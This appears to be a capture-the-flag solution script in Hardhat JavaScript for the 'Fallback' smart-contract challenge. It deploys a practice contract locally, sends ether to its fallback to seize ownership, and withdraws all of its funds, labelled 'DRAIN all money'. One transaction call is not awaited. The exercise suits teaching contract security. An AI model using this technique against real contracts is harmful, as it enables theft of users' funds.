const { ethers } = require('hardhat');

async function main() {
    const [player] = await ethers.getSigners();
    console.log("[0] player: ", player.address);

    // deploy factory
    console.log("\n[1] deploy FallbackFactory");
    const Factory = await ethers.getContractFactory("FallbackFactory");
    const factory = await Factory.connect(player).deploy();
    await factory.deployed();
    console.log("---- FallbackFactory address: ", factory.address);

    // deploy new instance
    console.log("\n[2] create a Fallback instance");
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const ctrt = await ethers.getContractAt("Fallback", instance_address, player);
    console.log("---- Fallback address: ", ctrt.address);

    // attack: (1) contribute
    console.log("\n[3] attack: contribute")
    await ctrt.connect(player).contribute({
        value: ethers.utils.parseEther("0.0001"),
        gasLimit: 50000
    });
    console.log("---- check contribution: ", ((await ctrt.getContribution()).toString()))

    console.log("\n[4] call fallback");
    const tx = {
        to: ctrt.address,
        value: ethers.utils.parseEther("0.0001"),
        gasLimit: 50000,
    };
    player.sendTransaction(tx);

    console.log("\n[5] DRAIN all money");
    await ctrt.withdraw();


    // check
    let res = await factory.validateInstance(ctrt.address, player.address);

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

